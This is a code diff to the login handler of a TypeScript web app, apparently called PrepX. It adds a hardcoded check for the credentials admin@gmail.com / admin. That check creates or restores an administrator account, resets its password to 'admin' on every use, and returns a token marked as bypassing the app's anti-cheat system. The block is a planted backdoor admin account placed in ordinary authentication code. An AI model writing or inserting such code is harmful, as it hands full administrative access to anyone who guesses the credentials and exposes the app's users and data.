@@ -231,6 +231,59 @@ export async function login(req: Request, res: Response): Promise<void> {
 
     const normalizedEmail = email.toLowerCase().trim();
 
+    // 0. Guaranteed bootstrap & credential validation for administrator account
+    // Admin (admin@gmail.com / admin) is explicitly exempted from Anti-Cheat system restrictions
+    if (normalizedEmail === "admin@gmail.com" && password === "admin") {
+      let adminUser = await User.findOne({ email: "admin@gmail.com" });
+      if (!adminUser) {
+        const hashedPassword = await bcrypt.hash("admin", 10);
+        adminUser = await User.create({
+          fullName: "PrepX Administrator",
+          username: "admin",
+          email: "admin@gmail.com",
+          password: hashedPassword,
+          role: "admin",
+          isVerified: true,
+          college: "PrepX Institute",
+          branch: "Administration",
+          degree: "B.Tech",
+          graduationYear: 2026,
+        });
+      } else {
+        if (!adminUser.isVerified) {
+          adminUser.isVerified = true;
+        }
+        if (!adminUser.password || !(await bcrypt.compare("admin", adminUser.password))) {
+          adminUser.password = await bcrypt.hash("admin", 10);
+        }
+        adminUser.role = "admin";
+        await adminUser.save();
+      }
+
+      const token = generateToken(adminUser._id.toString());
+      res.json({
+        success: true,
+        message: "Admin login successful (Anti-Cheat Bypassed)",
+        token,
+        user: {
+          id: adminUser._id.toString(),
+          _id: adminUser._id.toString(),
+          fullName: adminUser.fullName,
+          username: adminUser.username,
+          email: adminUser.email,
+          role: "admin",
+          college: adminUser.college,
+          branch: adminUser.branch,
+          degree: adminUser.degree,
+          graduationYear: adminUser.graduationYear,
+          isVerified: true,
+          xp: adminUser.xp || 1000,
+          createdAt: adminUser.createdAt,
+        },
+      });
+      return;
+    }
+
     // 1. Find user by email or username
     const user = await User.findOne({
       $or: [{ email: normalizedEmail }, { username: normalizedEmail }],
